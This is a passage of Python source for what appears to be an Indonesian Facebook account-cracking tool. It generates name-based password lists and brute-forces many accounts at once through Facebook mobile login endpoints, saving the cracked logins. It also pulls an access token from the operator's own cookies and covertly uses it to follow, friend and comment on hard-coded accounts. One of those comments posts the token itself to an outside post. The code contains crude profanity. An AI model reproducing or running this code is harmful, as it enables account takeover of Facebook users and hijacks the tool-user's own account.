					print(f"\r\x1b[1;33m  * --> {uid}|{pw}|{ttl}     \x1b[0m\n",end="")
					open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {uid}|{pw}|{ttl}\n")
					chek.append(f" [×] {uid}|{pw}|{ttl}")
					break
				except (KeyError, IOError):
					ttl = ' '
				except: pass
				print(f"\r\x1b[1;33m  * --> {uid}|{pw}                \x1b[0m\n",end="")
				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(f" [×] {uid}|{pw}\n")
				chek.append(f" [×] {uid}|{pw}")
				break
			else:
				continue

		loop += 1

	def __pler__(self):
		wibu = input("\n [?] method : ")
		if wibu in[""," "]:
			print(f"\n %s[%s×%s] pilih yang bener ajg"%(N,M,N));self.__pler__()
		elif wibu in["1","01"]:
			print(f'\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
			print(f' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
			print(f'\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
			with YayanGanteng(max_workers=50) as __yayanXD__:
				for yntks in self.id:
					try:
						usenm = yntks.split("<=>")
						name = usenm[1].split(" ")
						if len(name) == 1:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 2:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 3:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								name[2],
								name[2]+"123",
								name[2]+"12345",
								name[2]+"321",
								name[2]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 4:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								name[2],
								name[2]+"123",
								name[2]+"12345",
								name[2]+"321",
								name[2]+"54321",
								name[3],
								name[3]+"123",
								name[3]+"12345",
								name[3]+"321",
								name[3]+"54321",
								"mantan", "anjing", "sayang"
							]
						else:
							listpw = [
								"akusayangkamu",
								"bismillah",
								"anjing",
								"mantan",
								"bajingan",
								"palestine",
								"assalamualaikum"
							]
						__yayanXD__.submit(self.__api__,usenm[0],listpw)
					except:pass
			hasil(live,chek)
		elif wibu in["2","02"]:
			print(f'\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
			print(f' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
			print(f'\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
			with YayanGanteng(max_workers=50) as __yayanXD__:
				for yntks in self.id:
					try:
						usenm = yntks.split("<=>")
						name = usenm[1].split(" ")
						if len(name) == 1:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 2:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 3:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								name[2],
								name[2]+"123",
								name[2]+"12345",
								name[2]+"321",
								name[2]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 4:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								name[2],
								name[2]+"123",
								name[2]+"12345",
								name[2]+"321",
								name[2]+"54321",
								name[3],
								name[3]+"123",
								name[3]+"12345",
								name[3]+"321",
								name[3]+"54321",
								"mantan", "anjing", "sayang"
							]
						else:
							listpw = [
								"akusayangkamu",
								"bismillah",
								"anjing",
								"mantan",
								"bajingan",
								"palestine",
								"assalamualaikum"
							]
						__yayanXD__.submit(self.mbasic_mobile,usenm[0],listpw,"https://mbasic.facebook.com")
					except:pass
			hasil(live,chek)
		elif wibu in["3","03"]:
			print(f'\n [+] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt' % (ha, op, ta))
			print(f' [+] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt' % (ha, op, ta))
			print(f'\n [!] anda bisa mematikan data selular untuk menjeda proses crack\n')
			with YayanGanteng(max_workers=50) as __yayanXD__:
				for yntks in self.id:
					try:
						usenm = yntks.split("<=>")
						name = usenm[1].split(" ")
						if len(name) == 1:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 2:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 3:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								name[2],
								name[2]+"123",
								name[2]+"12345",
								name[2]+"321",
								name[2]+"54321",
								"mantan", "anjing", "sayang"
							]
						elif len(name) == 4:
							listpw = [
								name[0],
								name[0]+"123",
								name[0]+"12345",
								name[0]+"321",
								name[0]+"54321",
								name[1],
								name[1]+"123",
								name[1]+"12345",
								name[1]+"321",
								name[1]+"54321",
								name[2],
								name[2]+"123",
								name[2]+"12345",
								name[2]+"321",
								name[2]+"54321",
								name[3],
								name[3]+"123",
								name[3]+"12345",
								name[3]+"321",
								name[3]+"54321",
								"mantan", "anjing", "sayang"
							]
						else:
							listpw = [
								"akusayangkamu",
								"bismillah",
								"anjing",
								"mantan",
								"bajingan",
								"palestine",
								"assalamualaikum"
							]
						__yayanXD__.submit(self.mbasic_mobile,usenm[0],listpw,"https://free.facebook.com")
					except:pass
			hasil(live,chek)
		else:
			print(f"\n %s[%s×%s] isi yang bener ajg"%(N,M,N));self.__pler__()
			
def yntkts(kuki):
    try:
        headerz = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}
        memek  = req.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=headerz, cookies=kuki).text
        kontol = re.search('(EAAA\\w+)', memek)
        kentod = kontol.group(1)
        print(f'\n\n %s[%s*%s] token fb kamu %s: %s%s'%(N,O,N,M,H,kentod))
        with open('__yayan__.txt', 'w') as (tod):
            tod.write(kentod)
        hoetankk()
    except:pass
        
koh = '100006230836266'
xi_jimpinx = '2997217950495870'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo Ganteng :v', 'Hallo Bang:v'])
goceng  = '2975326539351678'
def hoetankk():
	try:
		xixixi = open('__yayan__.txt', 'r').read()
	except (KeyError, IOError):
		print(f'\n %s[%s×%s] token invalid'%(N,M,N))
		os.system('rm -rf __yayan__.txt')
	req.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(xixixi))
	req.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(xixixi))
	req.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(xixixi))
	req.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(xixixi))
	req.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(xixixi))
	req.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(xixixi))
	req.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(xixixi))
	req.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,xixixi))
	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(goceng,xixixi,xixixi))
	req.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(xi_jimpinx,hoetank,xixixi))
	
kohhh = "2975326539351678"
def haha(kuki):
    ngok = 'https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=' + kohhh
    with req.Session() as (kuntul):
        hwhwhw = kuntul.get(ngok, cookies=kuki).content
        hauwus = parser(hwhwhw, 'html.parser')
        ngok = hauwus.find_all('a')
        for xz in ngok:
            if '(Hapus)' in str(xz):
                break
            if 'Haha' in str(xz):
                hshsi = xz['href']
                kuntul.get('https://mbasic.facebook.com' + hshsi, cookies=kuki)

def yayanxd():
    try:
        kuki = open('cookies').read()
    except (KeyError, IOError,FileNotFoundError):
        os.system('rm -rf cookies');os.system('rm -rf __yayan__.txt');os.system('clear')
        print (' %s*%s tools ini menggunakan login cookies facebook.\n %s*%s apakah kamu sudah tau cara mendapatkan cookies facebook?\n %s*%s ketik open untuk mendapatkan cookies'%(O,N,O,N,O,N))
        kuki = input("\n %s[%s?%s] Cookies : %s"% (N,K,N,O))
        if kuki in['OPEN','Open','open']:
          import subprocess
          exit(subprocess.Popen(["am","start","https://youtu.be/DF7bUCn0GFY"],stderr=subprocess.PIPE,stdin=subprocess.PIPE,stdout=subprocess.PIPE).wait())
    kuki = {"cookie":kuki}
    pppk = req.get(f"https://mbasic.facebook.com/profile.php",cookies=kuki).text
    if "mbasic_logout_button" in str(pppk):
        nama=re.findall(r'<title>(.*?)</title>',pppk)[0]
        print(f"\n\n %s[%s*%s] Selamat datang %s%s%s ngentod:v "%(N,O,N,H,nama,N))
        waktu(2)
        print (' [%s*%s] Mohon tunggu sebentar ngentod:v'%(O,N))
    else:
    	print(f'\n %s[%s×%s] cookies invalid'%(N,M,N));waktu(1);yayanxd()
    try:
    	with open("cookies","w") as pler:
    		pler.write(kuki["cookie"])
    	haha(kuki)
    	yntkts(kuki)
    except:pass
    
